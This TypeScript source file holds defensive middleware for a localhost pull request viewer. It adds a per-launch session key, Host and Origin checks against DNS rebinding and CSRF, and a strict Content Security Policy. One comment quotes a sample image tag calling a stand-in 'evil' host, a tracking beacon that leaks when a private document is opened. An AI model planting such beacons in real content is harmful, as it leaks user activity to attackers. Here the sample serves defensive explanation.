import type { MiddlewareHandler } from 'hono';
import { randomBytes, timingSafeEqual } from 'node:crypto';
import { mkdirSync, writeFileSync, chmodSync } from 'node:fs';
import { homedir } from 'node:os';
import { join } from 'node:path';

/**
 * A per-launch key, replacing the fixed `X-Pilcrow: 1`.
 *
 * The constant was correct CSRF defence — a browser cannot set a custom header cross-origin
 * without a preflight we reject — but it was not a capability. Any local process could read
 * every private pull request and post approvals with a one-line `curl`, because the value was
 * published in the source and in SECURITY.md.
 *
 * Be honest about what this does and does not buy: a process running as the same user can still
 * read the key file. It stops drive-by scripts and anything running as another user; it is not
 * a defence against malicious code you have already executed as yourself.
 */
const SESSION_KEY = randomBytes(24).toString('base64url');
const KEY_FILE = join(homedir(), '.pilcrow', 'session');

export function sessionKey(): string {
  return SESSION_KEY;
}

/** Written so the Vite dev proxy can attach the header in development. */
export function publishSessionKey(): void {
  try {
    const dir = join(homedir(), '.pilcrow');
    mkdirSync(dir, { recursive: true, mode: 0o700 });
    chmodSync(dir, 0o700);
    writeFileSync(KEY_FILE, SESSION_KEY, { encoding: 'utf8', mode: 0o600 });
    chmodSync(KEY_FILE, 0o600);
  } catch {
    /* dev convenience only; the production path injects the key into the served HTML */
  }
}

function isAuthorised(supplied: string | undefined): boolean {
  if (!supplied) return false;
  const a = Buffer.from(supplied);
  const b = Buffer.from(SESSION_KEY);
  return a.length === b.length && timingSafeEqual(a, b);
}

/**
 * A localhost server holding a non-expiring `repo`-scoped token is reachable by any page the
 * user has open. Three cheap checks close the realistic attacks:
 *
 *   Host    — a DNS-rebinding attack resolves an attacker domain to 127.0.0.1, so the Host
 *             header will not be localhost even though the connection is. Reject those.
 *   Origin  — blocks ordinary cross-origin reads.
 *   X-Pilcrow  — a header a <form> cannot set, and which forces a preflight on cross-origin fetch
 *             that we then fail. This is what actually stops CSRF, since Origin is absent on
 *             some same-origin requests and cannot be relied on alone.
 */

const LOCAL_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1']);

/**
 * Content Security Policy.
 *
 * Two jobs, both about untrusted pull request content:
 *
 *   `frame-ancestors 'none'` stops any page embedding Pilcrow's real UI — including its
 *   paste-a-token field — inside attacker chrome.
 *
 *   `img-src` stops a pull request phoning home. A plain `<img src="https://evil/b.png?doc=x">`
 *   in a .md file is a read receipt: it tells whoever wrote it that a private document was
 *   opened, from your IP, at that moment, with no script involved. `srcset`, `<video poster>`
 *   and CSS `url()` are all covered by the same directive. GitHub-hosted images stay allowed,
 *   because that is where images committed to a repo actually live.
 *
 * `style-src` needs `'unsafe-inline'` for React's inline `style` props on the comment rail.
 * That is not a script vector, and the `style` *attribute* is separately stripped from PR
 * content by DOMPurify.
 */
const CSP = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: https://*.githubusercontent.com https://avatars.githubusercontent.com",
  "font-src 'self'",
  "connect-src 'self'",
  "form-action 'none'",
  "base-uri 'none'",
  "object-src 'none'",
  "frame-ancestors 'none'",
].join('; ');

function hostnameOf(value: string | undefined): string | null {
  if (!value) return null;
  const host = value.trim();
  if (host.startsWith('[')) {
    const close = host.indexOf(']');
    return close === -1 ? null : host.slice(0, close + 1);
  }
  const colon = host.lastIndexOf(':');
  return colon === -1 ? host : host.slice(0, colon);
}

export function localOnly(allowedOrigins: string[]): MiddlewareHandler {
  const allowed = new Set(allowedOrigins);

  return async (c, next) => {
    const host = hostnameOf(c.req.header('host'));
    if (!host || !LOCAL_HOSTS.has(host)) {
      return c.json({ error: 'pilcrow only accepts requests addressed to localhost.' }, 403);
    }

    const origin = c.req.header('origin');
    if (origin && !allowed.has(origin)) {
      return c.json({ error: `Origin ${origin} is not allowed.` }, 403);
    }

    if (c.req.path.startsWith('/api/') && !isAuthorised(c.req.header('x-pilcrow'))) {
      return c.json({ error: 'Missing or invalid X-Pilcrow header.' }, 403);
    }

    await next();

    c.header('Content-Security-Policy', CSP);
    c.header('X-Content-Type-Options', 'nosniff');
    c.header('X-Frame-Options', 'DENY');
    c.header('Referrer-Policy', 'no-referrer');
  };
}
